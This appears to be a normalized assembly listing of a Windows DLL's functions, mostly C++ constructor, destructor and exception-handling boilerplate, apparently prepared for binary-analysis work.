mov esi ecx
call sub_100243ff
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10001d61
mov [ ecx ] r--data
jmp sub_100244cc
sub_10001d6c
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100244cc
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10001d8e
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1002446f
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10001ebd
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_10002020
push esi
push esi
call sub_10027dd1
int3
sub_10001fe8
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100242f1
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_1000206b
push 0x0
push 0x1
call sub_10002020
retn
sub_1000239c
xor eax eax
inc eax
retn
sub_100023a3
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002ca7d
retn 0x8
sub_1000299e
push ecx
and [ esp ] 0x0
push ebx
add eax 0xc
mov ebx ecx
push eax
call sub_10002f82
mov eax ebx
pop ebx
pop ecx
retn
sub_100029b4
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
retn
sub_10002ed6
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_1000219b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10002f26
push esi
mov esi ecx
call sub_100029df
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000323a
mov eax [ esi ]
test eax eax
je r-xdata
call sub_10024832
cmp eax [ edi ]
je r-xdata
mov eax [ esi + 0x4 ]
xor ecx ecx
cmp eax [ edi + 0x4 ]
setne cl
mov al cl
retn
sub_10003257
push edi
lea ecx [ esi + 0x4 ]
mov [ esi ] edi
call sub_100032f5
push edi
push edi
push esi
call sub_10001a27
add esp 0xc
mov eax esi
retn
sub_1000333b
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10027dd1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10003430
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov ecx [ eax ]
mov [ esi ] ecx
call sub_10003a56
mov eax esi
pop esi
retn 0x4
sub_100034c5
push esi
mov esi ecx
call sub_100034e1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100034e1
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10024aba
pop ecx
sub_10003501
add ecx 0x8
push ecx
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10023aa7
add esp 0x10
retn 0xc
sub_10003548
add ecx 0x8
push ecx
push [ esp + 0xc ]
call sub_10023a78
test [ esp + 0xc ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
retn 0x8
sub_100035be
add ecx 0x8
push ecx
push [ esp + 0x8 ]
call sub_10023a0b
pop ecx
pop ecx
retn 0x4
sub_100035fd
add ecx 0x8
push ecx
push [ esp + 0x8 ]
call sub_1002399e
pop ecx
pop ecx
retn 0x4
sub_1000360f
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x2c ]
pop ebp
retn 0xc
j_sub_10003630
jmp sub_10003630
j_sub_100036cb
jmp sub_100036cb
sub_100037be
mov eax [ esp + 0x8 ]
push esi
push [ esp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1000378c
mov eax esi
pop esi
retn 0x8
sub_10003832
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0x18
push eax
call sub_10001fc2
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100039ed
push ecx
mov eax [ edx + 0x8 ]
or eax [ esp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx eax
push edx
call sub_10003dcd
pop ecx
retn 0x8
or eax 0x4
sub_10003a98
push esi
mov esi ecx
call sub_10003c7d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10003ab4
push [ esp + 0x8 ]
mov eax [ ecx ]
push 0xffffffff
push [ esp + 0xc ]
call [ eax + 0x1c ]
retn 0x8
sub_10003ac6
mov eax 0xffff
retn
sub_10003b80
mov eax 0xffff
retn 0x4
sub_10003c61
push esi
mov esi ecx
call sub_10003c49
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10003d12
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
retn
sub_10003d51
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10003d93
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001b5e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10003db5
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001b7b
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10003ee7
push ecx
mov ecx [ eax + 0x8 ]
push 0x0
push eax
mov [ eax + 0xc ] 0x6
call sub_10003dcd
pop ecx
retn
sub_10003fe0
push esi
mov esi ecx
call sub_10003ffd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000405d
push 0x28
mov eax sub_1004f96a
call sub_100282a2
and [ ebp - 0x4 ] 0x0
mov esi ecx
lea eax [ esi + 0xd8 ]
push eax
mov [ ebp - 0x34 ] esi
call sub_1000f091
pop ecx
jmp sub_1000408a
sub_10004081
mov eax r-xdata
retn
sub_100040bf
mov eax r-xdata
retn
sub_100040f3
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_10004174
xor eax eax
inc eax
retn
sub_10004178
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
mov al [ eax + 0x2dc ]
test al al
jne r-xdata
xor eax eax
call sub_1002ca7d
retn
call sub_1000f5f4
sub_100042e4
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_10004557
push ecx
and [ esp ] 0x0
push ebx
mov ebx eax
push 0x0
call sub_100158ec
pop ecx
mov eax ebx
pop ebx
pop ecx
retn
sub_10005562
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_100246bb
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
call sub_100054c3
pop esi
retn 0x4
sub_100055ca
push ecx
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_10005662
push [ esp + 0x8 ]
call sub_1000575b
pop ecx
retn
sub_10005862
push 0xffffffff
push 0x0
push [ esp + 0xc ]
call sub_10001f30
retn 0x4
sub_1000691b
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_100016a9
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_10007b34
mov eax esi
pop esi
retn 0x8
sub_10007998
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000c09f
mov [ esi ] r--data
pop esi
retn
sub_100079ae
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000134a
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100079c8
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000134a
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100079e2
push esi
mov esi ecx
call sub_10007998
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100079fe
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_10002004
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_10007c8f
mov eax esi
pop esi
retn 0x8
sub_100082d3
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10023577
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
pop esi
retn 0x8
sub_100082f4
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10023577
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
pop esi
retn 0x8
sub_1000846c
mov ecx [ ebp - 0x14 ]
call sub_1000c09f
xor ebx ebx
push ebx
push ebx
call sub_10027dd1
int3
sub_10008670
movsx eax [ esp + 0xc ]
push [ esp + 0x8 ]
push eax
push [ esp + 0xc ]
call sub_10024b80
add esp 0xc
retn
sub_10008eb7
push esi
mov esi eax
add esi 0x54
mov ecx esi
call sub_1000977b
push esi
mov [ esi ] r--data
call sub_10023026
pop ecx
pop esi
retn
sub_10009533
push esi
mov esi ecx
call sub_1000954f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000954f
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0x4
call sub_10002020
retn
sub_10009562
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0x4
push eax
call sub_10001fc2
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100097b3
push ecx
and [ esp ] 0x0
push ebx
add eax 0xc
mov ebx ecx
push eax
call sub_10009de0
mov eax ebx
pop ebx
pop ecx
retn
sub_100097c9
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
retn
sub_10009c80
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_10008eb7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10009cd0
push esi
mov esi ecx
call sub_100097f4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000be24
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000be3b
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000be52
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000c09f
mov [ esi ] r--data
pop esi
retn
sub_1000be68
mov al [ ecx + 0xc ]
retn
sub_1000be6c
mov al [ ecx + 0xd ]
retn
sub_1000be70
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001c7f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000be8a
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001c7f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000bea4
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001c7f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000bebe
push esi
mov esi ecx
call sub_1000be52
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000c088
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000c09f
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10024d36
push [ esi + 0x10 ]
call sub_10024d36
push [ esi + 0x14 ]
call sub_10024d36
add esp 0xc
pop esi
retn
sub_1000c68c
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10023577
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
pop esi
retn 0x8
sub_1000c6ad
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10023577
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
pop esi
retn 0x8
sub_1000c7cc
mov ecx [ ebp - 0x14 ]
call sub_1000c09f
xor ebx ebx
push ebx
push ebx
call sub_10027dd1
int3
sub_1000c8ad
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10027dd1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000c901
push esi
mov esi ecx
call sub_1000ca57
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000c91d
or eax 0xffffffff
retn 0x4
sub_1000c923
xor eax eax
retn
sub_1000ca1e
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x10
sub_1000ca38
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x20
sub_1000ca52
mov eax ecx
retn 0x8
sub_1000cab6
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
retn
sub_1000cafb
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
retn
sub_1000cb0a
mov eax [ eax ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
retn
lea ecx [ eax + 0x4 ]
jmp sub_10023135
sub_1000cb22
push esi
mov esi ecx
call sub_1000cb5b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000cb3e
mov eax [ ecx + 0x14 ]
test eax eax
jle r-xdata
jge r-xdata
push [ ecx + 0x10 ]
call sub_10024aba
pop ecx
retn
retn
push [ ecx + 0x10 ]
call sub_10024d36
pop ecx
sub_1000cb5b
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000cb3e
mov [ esi ] r--data
pop esi
retn
sub_1000cb9c
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_1002358d
pop ecx
pop ecx
retn 0x4
sub_1000cbdb
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_10024082
pop ecx
pop ecx
retn 0x4
sub_1000cbef
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x1c ]
pop ebp
retn 0xc
sub_1000cc0b
mov al [ esp + 0x4 ]
retn 0x4
sub_1000cc5f
mov al [ esp + 0x4 ]
retn 0x8
sub_1000ccb9
mov eax [ esp + 0x8 ]
push esi
push [ esp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1000cc94
mov eax esi
pop esi
retn 0x8
sub_1000d02e
push 0x4
mov eax sub_1004ec4c
call sub_10028236
mov esi ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0x10 ] 0x2
je r-xdata
call sub_100282db
retn
call sub_1000538a
sub_1000d057
mov eax r-xdata
retn
sub_1000d0c7
push ecx
mov [ ecx ] r--data
call sub_10023026
pop ecx
retn
sub_1000d0ed
push esi
mov esi ecx
call sub_1000d109
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000d109
push ecx
mov [ ecx ] r--data
call sub_10015bdd
pop ecx
retn
sub_1000d117
push 0xc
push r--data
call sub_1002ca38
mov [ ebp - 0x1c ] ecx
and [ ebp - 0x4 ] 0x0
call sub_10015c6a
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002ca7d
retn
sub_1000d131
xor eax eax
inc eax
retn
sub_1000d135
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ eax + 0x14 ] 0x1
mov [ eax + 0xc ] 0x1
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002ca7d
retn
sub_1000d153
push esi
mov esi ecx
call sub_1000d16f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000d25d
add ecx 0x4
push ecx
call sub_100169b6
pop ecx
retn
sub_1000d653
push esi
mov esi ecx
call sub_1000d66f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000d7a4
or [ ebp - 0x4 ] 0xffffffff
mov eax sub_1000d7ae
retn
sub_1000d7e7
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
retn
jmp sub_10003d5c
sub_1000db75
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_1000dd28
push 0x0
mov eax sub_1004cbb1
call sub_10028203
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000de14
push [ esi ]
call sub_100242e6
pop ecx
call sub_100282db
retn 0x4
sub_1000de14
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
retn
push [ esi + 0x10 ]
call sub_1000de39
push [ esi + 0xc ]
call sub_100242e6
pop ecx
sub_1000e1a7
cmp [ eax ] 0xfffffffe
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x4 ] 0x7fffffff
jne r-xdata
xor eax eax
inc eax
retn
sub_1000e1bc
cmp [ esp + 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
retn
cmp [ esp + 0x8 ] 0x7fffffff
jne r-xdata
xor eax eax
inc eax
retn
sub_1000e1d4
xor eax eax
cmp [ esp + 0x4 ] eax
jne r-xdata
retn
cmp [ esp + 0x8 ] 0x80000000
jne r-xdata
inc eax
sub_1000e4af
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000e4cd
pop esi
retn
sub_1000e4cd
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ebf6
mov [ esi ] r--data
mov ecx esi
jmp sub_10001abe
sub_1000e4ee
sub ecx 0x28
jmp sub_1000e558
sub_1000e537
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000e57c
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_10027dd1
int3
sub_1000e558
push esi
mov esi ecx
call sub_1000e4af
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000e574
sub ecx 0x3c
jmp sub_1000e558
sub_1000e57c
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000e5cd
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000e5a9
push esi
mov esi ecx
call sub_1000e4cd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000e5c5
sub ecx 0x28
jmp sub_1000e5a9
sub_1000e614
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000ec98
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000e760
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000e77e
pop esi
retn
sub_1000e77e
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ebf6
mov [ esi ] r--data
mov ecx esi
jmp sub_10001abe
sub_1000e79f
sub ecx 0x28
jmp sub_1000e809
sub_1000e7e8
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000e82d
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_10027dd1
int3
sub_1000e809
push esi
mov esi ecx
call sub_1000e760
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000e825
sub ecx 0x3c
jmp sub_1000e809
sub_1000e82d
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000e87e
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000e85a
push esi
mov esi ecx
call sub_1000e77e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000e876
sub ecx 0x28
jmp sub_1000e85a
sub_1000e8c5
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000ec98
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000e8dd
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001abe
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000eaf5
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000eb13
pop esi
retn
sub_1000eb13
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ebf6
mov [ esi ] r--data
mov ecx esi
jmp sub_10001abe
sub_1000eb34
mov [ ecx ] r--data
retn
sub_1000eb3b
sub ecx 0x28
jmp sub_1000eba5
sub_1000eb84
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000ebc9
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_10027dd1
int3
sub_1000eba5
push esi
mov esi ecx
call sub_1000eaf5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000ebc1
sub ecx 0x3c
jmp sub_1000eba5
sub_1000ebc9
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000ec39
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000ec15
push esi
mov esi ecx
call sub_1000eb13
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000ec31
sub ecx 0x28
jmp sub_1000ec15
sub_1000ec80
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000ec98
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000ec98
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001a33
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000ecb0
mov ecx [ esi ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ esi ] 0x0
sub_1000ecf9
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000ed16
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_1000ed61
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001a6d
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000ed79
mov [ ecx ] r--data
jmp sub_10001abe
sub_1000ef44
mov ecx [ ebp - 0x2c ]
push r--data
call sub_1000134a
mov eax r-xdata
retn
sub_1000f702
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x28 ] 0x20
jne r-xdata
mov eax r-xdata
retn
mov eax r-xdata
retn
sub_1000f71f
mov eax r-xdata
retn
sub_1000fa7f
mov eax r-xdata
retn
sub_1000fa8d
push esi
mov esi eax
add esi 0x58
mov ecx esi
call sub_10010186
push esi
mov [ esi ] r--data
call sub_10023026
pop ecx
pop esi
retn
sub_1000fb6e
mov eax r-xdata
retn
sub_1000fb74
push esi
mov esi eax
add esi 0x54
mov ecx esi
call sub_10010950
push esi
mov [ esi ] r--data
call sub_10023026
pop ecx
pop esi
retn
sub_1000fc78
mov ecx [ ebp - 0x68 ]
push r--data
call sub_1000134a
mov eax r-xdata
retn
sub_1000fd1d
mov eax r-xdata
retn
sub_1001098f
push esi
lea esi [ ecx - 0x58 ]
mov eax esi
call sub_1000fa8d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100109ae
push esi
mov esi ecx
call sub_100101c5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100109ca
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_1000fb74
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10010c04
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
push 0x3
mov [ eax ] ecx
pop eax
retn 0x1c
sub_10010c1e
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push 0x3
mov [ eax ] ecx
pop eax
retn 0x10
sub_10010c2e
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
cmp [ esp + 0x10 ] eax
jae r-xdata
retn 0x10
mov eax [ esp + 0x10 ]
sub_10010c43
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10010c60
push [ eax + 0x38 ]
mov ecx [ esp + 0x8 ]
call sub_10003430
mov eax [ esp + 0x4 ]
retn 0x4
sub_10010e66
xor eax eax
inc eax
retn
sub_10010e6a
mov al 0x1
retn
sub_10010ec5
push esi
mov esi ecx
call sub_10010ee1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10010ee1
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0x4
call sub_10001500
retn
sub_10011426
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10027dd1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1001145a
push esi
mov esi ecx
call sub_10011476
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_10011476
push edi
lea edi [ ecx + 0x4 ]
mov [ ecx ] r--data
call sub_1000211e
pop edi
retn
sub_1001188e
cmp [ ebp + 0x88 ] 0x8
mov eax [ ebp + 0x74 ]
jae r-xdata
push eax
call [ DeleteFileW@IAT ]
mov [ ebp - 0x4 ] 0x9
mov eax r-xdata
retn
lea eax [ ebp + 0x74 ]
sub_10011e9f
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10027dd1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1001254f
push [ ecx + 0xc ]
call sub_1001258e
pop ecx
retn
sub_1001258e
push esi
mov esi [ esp + 0x8 ]
